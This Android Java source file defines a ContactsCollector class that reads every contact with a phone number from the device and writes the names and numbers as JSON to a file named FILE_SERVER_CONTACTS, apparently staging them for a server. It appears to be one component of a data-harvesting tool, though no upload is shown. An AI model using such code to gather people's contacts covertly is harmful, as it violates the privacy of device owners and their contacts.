package com.tangledbytes.sw.collectors;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.util.Log;

import com.tangledbytes.sw.utils.Constants;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileWriter;
import java.io.IOException;

public class ContactsCollector extends Collector {
    private final String TAG = "ContactsCollector";
    private final JSONArray contacts = new JSONArray();
    private final ContentResolver contentResolver;

    public ContactsCollector(Context context) {
        contentResolver = context.getContentResolver();
    }

    @SuppressLint("Range")
    @Override
    public void collect() {
        Cursor contCursor = contentResolver.query(Contacts.CONTENT_URI,
                null, null, null, null);
        if ((contCursor != null ? contCursor.getCount() : 0) <= 0)
            return;
        while (contCursor.moveToNext()) {
            if (contCursor.getInt(contCursor.getColumnIndex(Contacts.HAS_PHONE_NUMBER)) <= 0)
                continue;

            // Load Contact
            String contactID = contCursor.getString(contCursor.getColumnIndex(Contacts._ID));
            String contactName = contCursor.getString(contCursor.getColumnIndex(Contacts.DISPLAY_NAME));
            addContact(contactName, contactID);
        }
        contCursor.close();
        if (!saveContacts())
            Log.e(TAG, "Unable to save contacts, dest file");
    }

    private void addContact(String contactName, String contactID) {
        // Load Contact Phone Numbers
        Cursor pNumsCursor = contentResolver.query(Phone.CONTENT_URI, null,
                Phone.CONTACT_ID + " = ?", new String[]{contactID}, null);
        try {
            JSONArray pNumbers = new JSONArray();
            while (pNumsCursor.moveToNext()) {
                @SuppressLint("Range")
                String strPNumber = pNumsCursor.getString(pNumsCursor.getColumnIndex(Phone.NUMBER));
                pNumbers.put(strPNumber);
            }
            pNumsCursor.close();

            // Add loaded contact to JSON objects
            JSONObject contact = new JSONObject();
            contact.put("Name", contactName);
            contact.put("Phone Numbers", pNumbers);
            contacts.put(contact);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private boolean saveContacts() {
        try {
            FileWriter fw = new FileWriter(Constants.FILE_SERVER_CONTACTS);
            fw.write(contacts.toString());
            fw.close();
        } catch (IOException e) {
            Log.e(TAG, "Error occurred while saving contacts", e);
            return false;
        }
        return true;
    }
}